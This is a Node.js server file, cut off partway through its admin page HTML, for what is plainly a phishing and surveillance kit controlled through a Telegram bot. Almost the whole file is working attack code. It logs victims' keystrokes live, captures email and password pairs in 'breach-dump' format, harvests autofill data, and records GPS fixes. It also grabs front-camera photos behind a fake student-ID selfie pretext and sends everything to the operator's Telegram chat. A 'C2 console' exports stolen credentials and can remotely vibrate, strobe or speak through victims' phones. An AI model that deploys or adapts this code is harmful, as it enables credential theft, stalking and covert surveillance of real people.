const express = require("express");
const path = require("path");
const http = require("http");
const https = require("https");
const crypto = require("crypto");
const fs = require("fs");

// ── Config: env vars first, then config.json ──────────────────────────
let CONFIG = {};
try {
  CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, "config.json"), "utf8"));
} catch (e) { /* config.json optional */ }

const BOT_TOKEN = process.env.BOT_TOKEN || CONFIG.bot_token;
const CHAT_ID = process.env.CHAT_ID || CONFIG.chat_id;
const ADMIN_KEY = process.env.ADMIN_KEY || CONFIG.admin_key || "changeme";
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("\n[!] Missing Telegram config.");
  console.error("    Create config.json in this folder:");
  console.error('    { "bot_token": "123456:ABC...", "chat_id": "987654321" }\n');
  process.exit(1);
}

const app = express();
app.use(express.json());
app.use(express.text({ type: "text/plain", limit: "2mb" })); // for sendBeacon
app.use(express.static(path.join(__dirname, "public")));

// ══════════════════════════════════════════════════════════════
//  TELEGRAM LAYER — generic API client (JSON + multipart)
// ══════════════════════════════════════════════════════════════
const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

async function tg(method, body = {}) {
  try {
    const r = await fetch(`${TG}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    return await r.json();
  } catch (e) {
    console.error(`[tg:${method}]`, e.message);
    return null;
  }
}

async function tgSend(html, extra = {}) {
  return tg("sendMessage", { chat_id: CHAT_ID, text: html, parse_mode: "HTML", ...extra });
}

async function tgMultipart(method, form) {
  try {
    const r = await fetch(`${TG}/${method}`, { method: "POST", body: form });
    return await r.json();
  } catch (e) {
    console.error(`[tg:${method}:multipart]`, e.message);
    return null;
  }
}

// ══════════════════════════════════════════════════════════════
//  SESSION REGISTRY + PERSISTENCE
// ══════════════════════════════════════════════════════════════
const sessions = new Map();
const STORE_PATH = path.join(__dirname, "sessions.json");

try {
  if (fs.existsSync(STORE_PATH)) {
    for (const s of JSON.parse(fs.readFileSync(STORE_PATH, "utf8"))) sessions.set(s.sid, s);
    console.log(`[+] Restored ${sessions.size} session(s) from disk`);
  }
} catch (e) { /* corrupt store, start fresh */ }

let saveTimer = null;
function saveSessions() {
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    try {
      fs.writeFileSync(STORE_PATH, JSON.stringify(Array.from(sessions.values()), null, 1));
    } catch (e) { /* non-fatal */ }
  }, 1500);
}

function newSession(sid, req) {
  return {
    sid, ip: clientIp(req), ua: req.headers["user-agent"] || "unknown",
    device: {}, location: null, keys: [], events: [],
    creds: null, autofill: null, visits: 0,
    dwellMs: 0, scrollPct: 0, touches: 0, keyCount: 0,
    heatBuf: null, exitSummary: null,
    firstSeen: Date.now(), lastSeen: Date.now(),
  };
}

function sessionFor(req, vid) {
  const ip = clientIp(req);
  const ua = req.headers["user-agent"] || "unknown";
  const sid = vid
    ? String(vid).replace(/[^a-f0-9]/gi, "").slice(0, 12)
    : crypto.createHash("sha256").update(ip + "|" + ua).digest("hex").slice(0, 12);

  if (!sessions.has(sid)) sessions.set(sid, newSession(sid, req));
  const s = sessions.get(sid);
  s.ip = isPrivateIp(s.ip) ? ip : s.ip;
  s.lastSeen = Date.now();
  return s;
}

const iconFor = (t) => ({ android: "🤖", ios: "🍎", windows: "🖥️", mac: "💻", linux: "🐧", other: "❓" }[t] || "❓");

// ── Device classification (for Telegram-side filtering) ────────
function classify(ua) {
  const u = String(ua);
  if (/iPhone|iPad|iPod/.test(u)) return { type: "ios", icon: "🍎", label: "iPhone/iPad" };
  if (/Android/.test(u)) {
    const m = u.match(/Android\s([\d.]+)/);
    const dev = u.match(/;\s([^)]+?)\s*Build/);
    return { type: "android", icon: "🤖", label: "Android " + (m ? m[1] : "") + (dev ? " " + dev[1].trim() : "") };
  }
  if (/Windows/.test(u)) return { type: "windows", icon: "🖥️", label: "Windows PC" };
  if (/Macintosh/.test(u)) return { type: "mac", icon: "💻", label: "Mac" };
  if (/Linux/.test(u)) return { type: "linux", icon: "🐧", label: "Linux PC" };
  return { type: "other", icon: "❓", label: "Unknown" };
}

// ══════════════════════════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════════════════════════
function clientIp(req) {
  const fwd = req.headers["x-forwarded-for"];
  if (fwd) return fwd.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

function isPrivateIp(ip) {
  return (
    ip === "unknown" ||
    ip.startsWith("127.") || ip.startsWith("10.") || ip.startsWith("192.168.") ||
    ip.startsWith("::1") || ip.startsWith("fc") || ip.startsWith("fd") ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip)
  );
}

function geoLookup(ip) {
  if (isPrivateIp(ip)) return Promise.resolve(null);
  return new Promise((resolve) => {
    const req = http.get(
      { hostname: "ip-api.com", path: `/json/${ip}?fields=status,country,regionName,city,isp,timezone,lat,lon,mobile,proxy`, timeout: 4000 },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          try {
            const d = JSON.parse(body);
            resolve(d.status === "success" ? d : null);
          } catch (e) { resolve(null); }
        });
      }
    );
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
  });
}

const esc = (s) => String(s ?? "?").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
const nowIST = () => new Date().toLocaleTimeString("en-IN", { hour12: false });

// Typing-action mirror throttle: max one ping per session per 3.5s
const lastTypingPing = new Map();
function mirrorTyping(sid) {
  const now = Date.now();
  if (now - (lastTypingPing.get(sid) || 0) < 3500) return;
  lastTypingPing.set(sid, now);
  tg("sendChatAction", { chat_id: CHAT_ID, action: "typing" });
}

// ══════════════════════════════════════════════════════════════
//  DOSSIER BUILDER
// ══════════════════════════════════════════════════════════════
function buildDossier(s) {
  const d = s.device || {};
  const cls = classify(s.ua);
  const returning = s.visits > 1 ? ` <i>↩ RETURNING DEVICE — visit #${s.visits}</i>` : "";

  let msg = `🎯 <b>NEW VISITOR @ ${nowIST()}</b>${returning}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `${cls.icon} <b>Device:</b> ${esc(d.platform)}\n`;
  msg += `🌐 <b>Browser:</b> ${esc(d.browser)} — <i>${esc(d.webview)}</i>\n`;
  msg += `🗣️ <b>Language:</b> ${esc(d.language)}\n`;
  msg += `🖥️ <b>Screen:</b> ${esc(d.screen)}${d.darkMode ? " (dark mode)" : ""}\n`;
  msg += `⏰ <b>Local time:</b> ${esc(d.localTime)}\n`;

  if (d.battery) msg += `🔋 <b>Battery:</b> ${d.battery.level}%${d.battery.charging ? " (charging)" : " (discharging)"}\n`;
  if (d.connection) msg += `📶 <b>Network:</b> ${esc(d.connection.effectiveType)}${d.connection.downlink ? ` · ~${esc(d.connection.downlink)}Mbps` : ""}${d.connection.saveData ? " · data saver" : ""}\n`;
  if (d.net && d.net.mbps) msg += `📡 <b>Measured:</b> ${d.net.mbps} Mbps · ${d.net.rtt}ms RTT to my server\n`;
  if (d.cores) msg += `⚙️ <b>CPU cores:</b> ${esc(d.cores)} | RAM: ${esc(d.memory || "?")}GB\n`;
  if (d.timezone) msg += `🕐 <b>Timezone:</b> ${esc(d.timezone)}\n`;
  if (d.locale) msg += `💱 <b>Locale:</b> ${esc(d.locale.currency)} · calendar ${esc(d.locale.calendar)} · ${d.locale.hour12 ? "12h" : "24h"} clock\n`;
  if (d.touchSupport) msg += `👆 <b>Touch:</b> yes (${esc(d.maxTouchPoints)} points)\n`;
  if (d.gpu) msg += `🎮 <b>GPU:</b> ${esc(d.gpu)}\n`;

  msg += `\n<b>── DEEP FINGERPRINT ──</b>\n`;
  if (d.webglHash) msg += `🧬 <b>Fingerprint hash:</b> <code>${esc(d.webglHash)}</code>\n`;
  if (d.rtcLocalIp) msg += `🕳️ <b>WebRTC leak — LAN IP:</b> <code>${esc(d.rtcLocalIp)}</code>\n`;
  if (d.rtcPublicIp && d.rtcPublicIp !== s.ip) msg += `🕳️ <b>WebRTC leak — real IP:</b> <code>${esc(d.rtcPublicIp)}</code>\n`;
  if (d.devices) msg += `📷 <b>Hardware:</b> ${d.devices.camera} camera(s), ${d.devices.mic} mic(s), ${d.devices.speaker} speaker(s)\n`;
  if (d.drm) msg += `🎬 <b>DRM level:</b> ${esc(d.drm)}\n`;
  if (d.fonts) msg += `🔤 <b>Installed fonts:</b> ${d.fonts.length} identified\n`;
  if (d.storage) msg += `💾 <b>Storage:</b> ~${d.storage.quotaMB}MB quota, ${d.storage.usedMB}MB used\n`;
  if (d.perms) {
    const granted = Object.entries(d.perms).filter(([, v]) => v === "granted").map(([k]) => k);
    const denied = Object.entries(d.perms).filter(([, v]) => v === "denied").map(([k]) => k);
    msg += `🔔 <b>Permissions:</b> granted: ${esc(granted.join(", ") || "none")} · denied: ${esc(denied.join(", ") || "none")}\n`;
  }
  if (d.tabs > 0) msg += `🪟 <b>Opened in ${d.tabs + 1} tabs</b>\n`;
  if (d.fonts && d.fonts.length) msg += `🧾 <b>Font set:</b> <code>${esc(d.fonts.slice(0, 8).join(", "))}${d.fonts.length > 8 ? "…" : ""}</code>\n`;

  msg += `\n<b>── IDENTITY ──</b>\n`;
  msg += `🌍 <b>IP:</b> <code>${esc(s.ip)}</code>\n`;
  msg += `🆔 <b>Visitor ID:</b> <code>${esc(s.sid)}</code>\n`;

  if (s.location) {
    msg += `📍 <b>Location:</b> ${esc(s.location.city)}, ${esc(s.location.region)} (${esc(s.location.country)})\n`;
    msg += `📡 <b>ISP:</b> ${esc(s.location.isp)}${s.location.mobile ? " · cellular" : ""}${s.location.proxy ? " · ⚠️ VPN/proxy detected" : ""}\n`;
  } else if (isPrivateIp(s.ip)) {
    msg += `📍 <b>Location:</b> local network (testing mode)\n`;
  }

  if (d.referrer) msg += `↩️ <b>Arrived from:</b> ${esc(d.referrer)}\n`;

  msg += `\n<i>🛡️ MITRE ATT&amp;CK: T1592.001 · T1589 · T1417 (Input Capture) · T1430 (Track Location)</i>`;
  return msg;
}

// ══════════════════════════════════════════════════════════════
//  LIVE-EDIT KEYSTROKE MESSAGES (one message per field, typed live)
// ══════════════════════════════════════════════════════════════
const liveKeys = new Map(); // "sid|context" -> { id, raw }

async function streamKeys(s, keys, context) {
  const k = `${s.sid}|${context}`;
  let entry = liveKeys.get(k);
  if (!entry) {
    const r = await tgSend(
      `⌨️ <b>LIVE TYPING</b> <i>[${esc(context)}] — ${classify(s.ua).label}</i>\n<code>${esc(keys)}</code>`,
      { reply_markup: { inline_keyboard: [[
        { text: "📋 Full keys", callback_data: `keys:${s.sid}` },
        { text: "👤 Who", callback_data: `who:${s.sid}` },
      ]] } }
    );
    if (r && r.result) liveKeys.set(k, { id: r.result.message_id, raw: keys });
    return;
  }
  entry.raw += keys;
  if (entry.raw.length > 3200) {
    liveKeys.delete(k);
    return;
  }
  await tg("editMessageText", {
    chat_id: CHAT_ID, message_id: entry.id,
    text: `⌨️ <b>LIVE TYPING</b> <i>[${esc(context)}] — ${classify(s.ua).label}</i>\n<code>${esc(entry.raw)}</code>`,
    parse_mode: "HTML",
  });
}

// ══════════════════════════════════════════════════════════════
//  ENDPOINTS
// ══════════════════════════════════════════════════════════════

// ── New visitor dossier ────────────────────────────────────────────────
app.post("/collect", async (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const d = req.body || {};

  s.device = {
    platform: d.platform, browser: d.browser, webview: d.webview,
    language: d.language, languages: d.languages,
    screen: d.screen, darkMode: d.darkMode, localTime: d.localTime,
    timezone: d.timezone, locale: d.locale,
    cores: d.cores, memory: d.memory,
    battery: d.battery, connection: d.connection, net: d.net,
    touchSupport: d.touchSupport, maxTouchPoints: d.maxTouchPoints,
    gpu: d.gpu, webglHash: d.webglHash, audioFingerprint: d.audioFingerprint,
    plugins: d.plugins, referrer: d.referrer, notifications: d.notifications,
    rtcLocalIp: d.rtcLocalIp, rtcPublicIp: d.rtcPublicIp,
    devices: d.devices, drm: d.drm, fonts: d.fonts, storage: d.storage,
    perms: d.perms, tabs: d.tabs,
  };
  s.visits += 1;
  saveSessions();

  const geo = await geoLookup(s.ip);
  if (geo) s.location = {
    city: geo.city, region: geo.regionName, country: geo.country,
    isp: geo.isp, tz: geo.timezone, lat: geo.lat, lon: geo.lon,
    mobile: geo.mobile, proxy: geo.proxy,
  };
  s.lastGeoUpdate = Date.now();

  const cls = classify(s.ua);
  tgSend(buildDossier(s), { reply_markup: { inline_keyboard: [[
    { text: "👤 Dossier", callback_data: `who:${s.sid}` },
    { text: "⌨️ Keystrokes", callback_data: `keys:${s.sid}` },
    { text: "🗂 Devices", callback_data: "list" },
  ]] } });

  // Real map pin under the dossier
  if (s.location && s.location.lat) {
    tg("sendLocation", { chat_id: CHAT_ID, latitude: s.location.lat, longitude: s.location.lon });
  }
  res.json({ ok: true, sid: s.sid });
});

// ── Keystrokes: store + live-edit stream + typing mirror ──────────────
app.post("/keys", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const keys = String(req.body.keys || "").slice(0, 2000);
  if (!keys) return res.json({ ok: true });

  const context = req.body.context || "page";
  s.keys.push({ t: Date.now(), keys, context });
  s.keyCount = s.keys.length;
  if (s.keys.length > 500) s.keys.splice(0, s.keys.length - 500);
  saveSessions();

  mirrorTyping(s.sid);
  streamKeys(s, keys, context).catch(() => {});
  res.json({ ok: true });
});

// ── Typing presence (client pings while victim types) ─────────────────
app.post("/typing", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  mirrorTyping(s.sid);
  res.json({ ok: true });
});

// ── Behavioral narration events ───────────────────────────────────────
app.post("/event", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const text = String(req.body.text || "").slice(0, 300);
  if (!text) return res.json({ ok: true });

  s.events.push({ t: Date.now(), text });
  if (s.events.length > 100) s.events.shift();
  saveSessions();

  const cls = classify(s.ua);
  tgSend(`🫀 <b>${esc(cls.label)}</b> <i>[${esc(s.sid)}]</i>\n${esc(text)}`);
  res.json({ ok: true });
});

// ── Autofill harvest report ───────────────────────────────────────────
app.post("/autofill", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const f = {
    name: req.body.name, phone: req.body.phone, org: req.body.org,
    street: req.body.street, postal: req.body.postal,
  };
  const got = Object.entries(f).filter(([, v]) => v);
  if (!got.length) return res.json({ ok: true });

  s.autofill = f;
  saveSessions();

  let msg = `🕸️ <b>AUTOFILL HARVEST — victim never typed these</b>\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  for (const [k, v] of got) msg += `${k === "name" ? "👤" : k === "phone" ? "📞" : "🏠"} <b>${k}:</b> <code>${esc(v)}</code>\n`;
  tgSend(msg);
  res.json({ ok: true });
});

// ── Credentials — breach-dump format ──────────────────────────────────
app.post("/creds", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const { email, password } = req.body || {};
  if (!email && !password) return res.json({ ok: true });

  s.creds = { email, password, t: Date.now() };
  saveSessions();

  const cls = classify(s.ua);
  tgSend(
    `🔐 <b>CREDENTIALS CAPTURED</b> — ${cls.icon} ${esc(cls.label)}\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 <b>Email:</b> <code>${esc(email)}</code>\n` +
    `🔑 <b>Password:</b> <code>${esc(password)}</code>\n` +
    `🌍 <b>IP:</b> <code>${esc(s.ip)}</code>${s.location ? `\n📍 <b>Geo:</b> ${esc(s.location.city)}, ${esc(s.location.region)}` : ""}\n` +
    `🧬 <b>Visitor:</b> <code>${esc(s.sid)}</code>\n\n` +
    `<i>breach-dump line:</i> <code>${esc(email)}:${esc(password)}:${esc(s.ip)}</code>`
  );
  res.json({ ok: true });
});

// ── Exit summary from sendBeacon ──────────────────────────────────────
app.post("/exit", (req, res) => {
  let b = {};
  try { b = typeof req.body === "string" ? JSON.parse(req.body) : req.body; } catch (e) {}
  const s = sessionFor(req, b.vid);

  s.dwellMs = b.dwellMs || s.dwellMs;
  s.scrollPct = b.scrollPct || s.scrollPct;
  s.touches = b.touches || s.touches;
  s.keyCount = s.keys.length;
  const dyn = b.keyDyn;
  saveSessions();

  const mins = Math.floor((s.dwellMs || 0) / 60000);
  const secs = Math.round(((s.dwellMs || 0) % 60000) / 1000);
  let msg = `📋 <b>SESSION SUMMARY</b> — <code>${esc(s.sid)}</code>\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `⏱️ Dwell: ${mins}m ${secs}s | ⌨️ Keys: ${s.keys.length} | 👆 Touches: ${s.touches}\n`;
  msg += `📖 Read to: ${s.scrollPct}% of page\n`;
  if (dyn) msg += `🧠 <b>Keystroke biometrics:</b> ${dyn.wpm} WPM · avg ${dyn.avg}ms between keys · ${dyn.bursts} burst-pairs\n`;
  tgSend(msg);
  res.json({ ok: true });
});

// ── Touch heatmap upload (client-rendered PNG) ────────────────────────
app.post("/heatmap", (req, res) => {
  const s = sessionFor(req, req.query.vid || req.headers["x-vid"] || "");
  if (!req.body || !req.body.length) return res.json({ ok: true });
  s.heatBuf = Buffer.from(req.body);
  s.touches = s.touches || 1;
  saveSessions();

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", `👆 Touch heatmap — ${classify(s.ua).label} [${s.sid}] (${s.touches} taps)`);
  form.append("photo", new Blob([s.heatBuf], { type: "image/png" }), "heat.png");
  tgMultipart("sendPhoto", form);
  res.json({ ok: true });
});

// ── GPS fixes — breadcrumb tracking + map pin ──────────────────────
app.post("/gps", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const { lat, lon, acc, spd, alt, source } = req.body || {};
  if (!lat || !lon) return res.json({ ok: true });

  s.gps = { lat, lon, acc, t: Date.now(), source: source || "" };
  s.fixes = (s.fixes || 0) + 1;
  saveSessions();

  let msg = `📍 <b>GPS FIX #${s.fixes} — ${classify(s.ua).label}</b> <i>[${esc(s.sid)}]</i>\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `🎯 <b>Coords:</b> <code>${esc(lat)}, ${esc(lon)}</code>\n`;
  msg += `📏 <b>Accuracy:</b> ±${esc(Math.round(acc))}m${alt != null ? ` · altitude ${esc(Math.round(alt))}m` : ""}${spd != null && spd > 0.3 ? ` · speed ${(spd * 3.6).toFixed(1)} km/h` : ""}\n`;
  msg += `🚪 <b>Obtained:</b> ${esc(source || "user grant")}\n`;
  msg += `<i>🛡️ MITRE ATT&amp;CK: T1430 (Track Location)</i>`;
  tgSend(msg);
  tg("sendLocation", { chat_id: CHAT_ID, latitude: lat, longitude: lon });
  res.json({ ok: true });
});

// ── Front camera capture ──────────────────────────────────────────────
app.post("/selfie", (req, res) => {
  const s = sessionFor(req, req.query.vid || "");
  if (!req.body || !req.body.length) return res.json({ ok: true });
  const buf = Buffer.from(req.body);

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", `📷 <b>FRONT CAMERA CAPTURE</b> — ${classify(s.ua).label} <i>[${esc(s.sid)}]</i>\nPretext: Student ID selfie verification`);
  form.append("photo", new Blob([buf], { type: "image/png" }), "selfie.png");
  tgMultipart("sendPhoto", form);
  s.events.push({ t: Date.now(), text: "📸 Front camera frame captured" });
  saveSessions();
  res.json({ ok: true });
});

// ── C2 command queue — operator drives the victim phone ──────────────
const cmdQueue = new Map();
function queueCmd(sid, action, arg) {
  if (!sessions.has(sid)) return false;
  if (!cmdQueue.has(sid)) cmdQueue.set(sid, []);
  cmdQueue.get(sid).push({ action, arg });
  return true;
}

app.get("/command", (req, res) => {
  const s = sessionFor(req, req.query.vid || "");
  const cmds = cmdQueue.get(s.sid) || [];
  cmdQueue.set(s.sid, []);
  res.json({ commands: cmds });
});

// ── Bandwidth test asset ──────────────────────────────────────────────
app.get("/ping", (req, res) => {
  const n = Math.min(parseInt(req.query.n) || 0, 500000);
  res.set({ "Cache-Control": "no-store", "Content-Type": "application/octet-stream" });
  res.send(Buffer.alloc(n, "a"));
});

// ══════════════════════════════════════════════════════════════
//  TELEGRAM COMMAND CONSOLE (long-poll getUpdates)
// ══════════════════════════════════════════════════════════════
function sessionLine(s) {
  const cls = classify(s.ua);
  const d = s.device || {};
  const bat = d.battery ? `${d.battery.level}%${d.battery.charging ? "⚡" : "🔋"}` : "—";
  const net = d.connection ? d.connection.effectiveType : "—";
  const online = Date.now() - s.lastSeen < 30000;
  const geo = s.location ? `${s.location.city}, ${s.location.country}` : "unknown";
  return `${cls.icon} <code>${esc(s.sid)}</code> · ${esc(cls.label)} · ${bat} · ${net} · ${esc(geo)}${online ? " · 🟢" : " · ⚫"}`;
}

function buildCsv() {
  const rows = [["visitor_id", "first_seen", "last_seen", "ip", "device", "browser", "language", "screen", "gpu", "timezone", "city", "region", "country", "isp", "cpu_cores", "ram_gb", "battery", "network", "key_count", "email", "password", "user_agent"]];
  for (const s of sessions.values()) {
    const d = s.device || {};
    rows.push([
      s.sid, new Date(s.firstSeen).toISOString(), new Date(s.lastSeen).toISOString(),
      s.ip, d.platform || "", d.browser || "", d.language || "", d.screen || "", d.gpu || "",
      d.timezone || "", s.location?.city || "", s.location?.region || "", s.location?.country || "",
      s.location?.isp || "", d.cores || "", d.memory || "",
      d.battery ? d.battery.level + "%" : "", d.connection?.effectiveType || "",
      s.keys.length, s.creds?.email || "", s.creds?.password || "", s.ua,
    ]);
  }
  return rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\r\n");
}

async function handleCommand(text) {
  const [cmd, ...args] = text.trim().split(/\s+/);
  const c = cmd.toLowerCase();

  if (c === "/help" || c === "/start") {
    return tgSend(
      `🛰️ <b>C2 CONSOLE — COMMANDS</b>\n` +
      `<code>/list</code> — all devices (filterable feed)\n` +
      `<code>/filter android|ios|windows|mac|linux</code> — devices by platform\n` +
      `<code>/who &lt;id&gt;</code> — full dossier for a device\n` +
      `<code>/keys &lt;id&gt; [n]</code> — last n keystroke entries\n` +
      `<code>/creds</code> — all captured credentials\n` +
      `<code>/events &lt;id&gt;</code> — behavior narration log\n` +
      `<code>/heat &lt;id&gt;</code> — touch heatmap photo\n` +
      `<code>/gps &lt;id&gt;</code> — queue a GPS fix request (prompt on their screen)\n` +
      `<code>/buzz &lt;id&gt;</code> — make their phone vibrate\n` +
      `<code>/speak &lt;id&gt; &lt;text&gt;</code> — their phone says it out loud\n` +
      `<code>/flash &lt;id&gt;</code> — strobe their screen\n` +
      `<code>/csv</code> — breach-dump export of every session\n` +
      `<code>/stats</code> — totals\n` +
      `<code>/clear</code> — wipe demo data`
    );
  }

  if (c === "/list") {
    const list = Array.from(sessions.values()).sort((a, b) => b.lastSeen - a.lastSeen);
    if (!list.length) return tgSend("📭 No devices yet — open the demo link.");
    let msg = `🗂 <b>DEVICE REGISTRY — ${list.length} total</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
    msg += list.map(sessionLine).join("\n");
    return tgSend(msg);
  }

  if (c === "/filter") {
    const t = (args[0] || "").toLowerCase();
    const iconOf = { android: "🤖", ios: "🍎", windows: "🖥️", mac: "💻", linux: "🐧", other: "❓" };
    const list = Array.from(sessions.values()).filter(s => classify(s.ua).type === t);
    if (!list.length) return tgSend(`🔍 No ${esc(t)} devices seen. Types: android, ios, windows, mac, linux.`);
    let msg = `${iconOf[t] || "❓"} <b>${esc(t.toUpperCase())} DEVICES — ${list.length}</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
    msg += list.map(sessionLine).join("\n");
    return tgSend(msg);
  }

  if (c === "/who") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    return s ? tgSend(buildDossier(s)) : tgSend("❓ Usage: /who <visitor-id> — see /list");
  }

  if (c === "/keys") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    if (!s) return tgSend("❓ Usage: /keys <visitor-id> [n]");
    const n = Math.min(parseInt(args[1]) || 10, 50);
    const last = s.keys.slice(-n).map(k => `[${esc(k.context)}] <code>${esc(k.keys)}</code>`).join("\n") || "no keystrokes";
    return tgSend(`⌨️ <b>KEYSTROKES</b> — <code>${esc(s.sid)}</code> (last ${n} of ${s.keys.length})\n${last}`);
  }

  if (c === "/events") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    if (!s) return tgSend("❓ Usage: /events <visitor-id>");
    const log = s.events.slice(-20).map(e => `[${new Date(e.t).toLocaleTimeString("en-IN", { hour12: false })}] ${esc(e.text)}`).join("\n") || "no events";
    return tgSend(`🫀 <b>BEHAVIOR LOG</b> — <code>${esc(s.sid)}</code>\n${log}`);
  }

  if (c === "/creds") {
    const withCreds = Array.from(sessions.values()).filter(s => s.creds);
    if (!withCreds.length) return tgSend("📭 No credentials captured yet.");
    const lines = withCreds.map(s =>
      `<code>${esc(s.creds.email)}:${esc(s.creds.password)}:${esc(s.ip)}</code> · <code>${esc(s.sid)}</code>`
    ).join("\n");
    return tgSend(`🔐 <b>CREDENTIAL DUMP</b>\n${lines}`);
  }

  if (c === "/heat") {
    const s = sessions.get((args[0] || "").slice(0, 12));
    if (!s || !s.heatBuf) return tgSend("📭 No heatmap stored for that device (uploads when the victim hides the tab).");
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", `👆 Stored heatmap — ${classify(s.ua).label} [${s.sid}]`);
    form.append("photo", new Blob([s.heatBuf], { type: "image/png" }), "heat.png");
    return tgMultipart("sendPhoto", form);
  }

  if (c === "/csv") {
    if (!sessions.size) return tgSend("📭 No sessions to export.");
    const csv = buildCsv();
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", `💾 Breach-dump export — ${sessions.size} session(s)`);
    form.append("document", new Blob([csv], { type: "text/csv" }), `linkdemo_dump_${Date.now()}.csv`);
    return tgMultipart("sendDocument", form);
  }

  if (c === "/stats") {
    const all = Array.from(sessions.values());
    const byType = {};
    all.forEach(s => { const t = classify(s.ua).type; byType[t] = (byType[t] || 0) + 1; });
    const online = all.filter(s => Date.now() - s.lastSeen < 30000).length;
    const keyTotal = all.reduce((a, s) => a + s.keys.length, 0);
    return tgSend(
      `📊 <b>STATS</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
      `👁️ Devices: ${all.length} (${online} online)\n` +
      Object.entries(byType).map(([t, n]) => `   ${iconFor(t)} ${t}: ${n}`).join("\n") + "\n" +
      `⌨️ Keystrokes: ${keyTotal}\n` +
      `🔐 Credentials: ${all.filter(s => s.creds).length}\n` +
      `🕸️ Autofill harvests: ${all.filter(s => s.autofill).length}`
    );
  }

  if (c === "/buzz") {
    const ok = queueCmd((args[0] || "").slice(0, 12), "buzz");
    return tgSend(ok ? "📳 Vibration queued — their phone buzzes within 3s" : "❓ Usage: /buzz <visitor-id> — see /list");
  }

  if (c === "/speak") {
    const sid = (args[0] || "").slice(0, 12);
    const text = args.slice(1).join(" ") || "This device has been compromised.";
    const ok = queueCmd(sid, "speak", text);
    return tgSend(ok ? `🔊 Speak queued — their phone says it out loud:\n<i>${esc(text)}</i>` : "❓ Usage: /speak <visitor-id> <text> — see /list");
  }

  if (c === "/flash") {
    const ok = queueCmd((args[0] || "").slice(0, 12), "flash");
    return tgSend(ok ? "⚡ Flash queued — their screen strobes within 3s" : "❓ Usage: /flash <visitor-id> — see /list");
  }

  if (c === "/gps") {
    const ok = queueCmd((args[0] || "").slice(0, 12), "gps");
    return tgSend(ok ? "📍 GPS request queued — the permission prompt appears on their screen within 3s. If they ever allowed location before, it tracks SILENTLY." : "❓ Usage: /gps <visitor-id> — see /list");
  }

  if (c === "/clear") {
    sessions.clear();
    liveKeys.clear();
    try { fs.unlinkSync(STORE_PATH); } catch (e) {}
    return tgSend("🧹 All demo data wiped.");
  }

  if (c.startsWith("/")) return tgSend(`❓ Unknown command — try /help`);
}

let tgOffset = 0;
async function pollCommands() {
  while (true) {
    try {
      const r = await fetch(`${TG}/getUpdates`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ offset: tgOffset, timeout: 25, allowed_updates: ["message", "callback_query"] }),
      });
      const data = await r.json();
      for (const u of (data.result || [])) {
        tgOffset = u.update_id + 1;
        if (u.message && String(u.message.chat.id) === String(CHAT_ID) && u.message.text) {
          await handleCommand(u.message.text).catch(e => console.error("[cmd]", e.message));
        }
        if (u.callback_query && String(u.callback_query.message.chat.id) === String(CHAT_ID)) {
          const [action, sid] = (u.callback_query.data || "").split(":");
          if (action === "who") { const s = sessions.get(sid); if (s) await tgSend(buildDossier(s)); }
          if (action === "keys") { const s = sessions.get(sid); if (s) await handleCommand(`/keys ${sid} 15`); }
          if (action === "list") await handleCommand("/list");
          tg("answerCallbackQuery", { callback_query_id: u.callback_query.id });
        }
      }
    } catch (e) { /* network hiccup — retry */ }
  }
}

// ══════════════════════════════════════════════════════════════
//  ADMIN DASHBOARD
// ══════════════════════════════════════════════════════════════
app.get("/admin/data", (req, res) => {
  if (req.query.key !== ADMIN_KEY) return res.status(403).json({ error: "forbidden" });

  const list = Array.from(sessions.values())
    .sort((a, b) => b.lastSeen - a.lastSeen)
    .map((s) => ({
      sid: s.sid,
      ip: s.ip,
      device: s.device,
      location: s.location,
      visits: s.visits,
      keys: s.keys.slice(-30),
      keyCount: s.keys.length,
      creds: s.creds,
      firstSeen: s.firstSeen,
      lastSeen: s.lastSeen,
      online: Date.now() - s.lastSeen < 30000,
    }));

  res.json({ sessions: list, total: list.length, now: Date.now() });
});

app.get("/admin", (req, res) => {
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ops</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: 'Segoe UI', monospace; background:#0d1117; color:#c9d1d9; padding:16px; }
  h1 { font-size:20px; color:#58a6ff; margin-bottom:4px; }
  .sub { color:#8b949e; font-size:12px; margin-bottom:16px; }
